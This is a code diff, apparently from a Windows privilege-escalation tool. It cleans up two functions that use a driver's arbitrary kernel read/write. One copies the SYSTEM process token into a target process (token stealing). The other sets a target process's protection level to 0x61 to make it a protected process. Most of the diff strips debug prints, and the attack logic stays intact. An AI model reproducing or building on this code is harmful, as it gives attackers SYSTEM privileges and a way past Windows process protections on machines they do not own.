@@ -4,14 +4,6 @@
 #include "myIO.hpp"
 #include "NT_Definitions.h"
 
-// do wykasowania
-#include <cassert>
-#include <iomanip>
-#include <iostream>
-#include <vector>
-#include <Windows.h>
-//
-
 #include <string>
 #include <map>
 #include <stdexcept>
@@ -189,73 +181,24 @@ bool stealToken(_In_ DriverOps* driver, _In_ DWORD64 systemProcess, _In_ DWORD64
     krw.dst = (LPVOID)(targetProcess + current_offsets.Token);
     krw.size = sizeof(_EX_FAST_REF);
 
-    /* DEBUG
-    KernelReadWrite krw_1 = { 0 };
-    ULONGLONG Val_1 = 0;
-    krw_1.src = (LPVOID)(systemProcess + g_offsets.Token);
-    krw_1.dst = (LPVOID)(&Val_1);
-    krw_1.size = sizeof(_EX_FAST_REF);
-    driver->arbitraryRW(&krw_1);
-    printf("Token system: %llu\n", Val_1);
-
-    KernelReadWrite krw_2 = { 0 };
-    ULONGLONG Val_2 = 0;
-    krw_2.src = (LPVOID)(targetProcess + g_offsets.Token);
-    krw_2.dst = (LPVOID)(&Val_2);
-    krw_2.size = sizeof(_EX_FAST_REF);
-    driver->arbitraryRW(&krw_2);
-    printf("Token target: %llu\n", Val_2);
-    */
     auto returnVal = driver->arbitraryRW(&krw);
-    /* Debug
-    printf("after steal:\n");
-    driver->arbitraryRW(&krw_1);
-    printf("Token system: %llu\n", Val_1);
-    driver->arbitraryRW(&krw_2);
-    printf("Token target: %llu\n", Val_2);
-    */
 
     return returnVal;
 }
 
-//0x1 bytes (sizeof)
-struct _PS_PROTECTION
-{
-    union
-    {
-        UCHAR Level;                                                        //0x0
-        struct
-        {
-            UCHAR Type : 3;                                                   //0x0
-            UCHAR Audit : 1;                                                  //0x0
-            UCHAR Signer : 4;                                                 //0x0
-        };
-    };
-};
-
 bool elevatePPL(_In_ DriverOps* driver, _In_ DWORD64 targetProcess)
 {
-    //KernelReadWrite krw = { 0 };
-    //krw.src = (LPVOID)(targetProcess + g_offsets.Token);
-    //krw.dst = (LPVOID)(targetProcess + g_offsets.Token);
-    //krw.size = sizeof(_EX_FAST_REF);
-
- //   /* DEBUG
 
     KernelReadWrite krw_2 = { 0 };
     struct _PS_PROTECTION Val_2 {};
+
     Val_2.Level = 0x61;
     krw_2.dst = (LPVOID)(targetProcess + current_offsets.PS_PROTECTION);
     krw_2.src = (LPVOID)(&Val_2);
     krw_2.size = sizeof(struct _PS_PROTECTION);
-    driver->arbitraryRW(&krw_2);
-    printf("Token target: %hhu\n", Val_2.Level);
-//    */
-    auto returnVal = driver->arbitraryRW(&krw_2);
-//    /* Debug
 
-    printf("Token target: %hhu\n", Val_2.Level);
-//    */
+    driver->arbitraryRW(&krw_2);
+    auto returnVal = driver->arbitraryRW(&krw_2);
 
     return returnVal;
 }
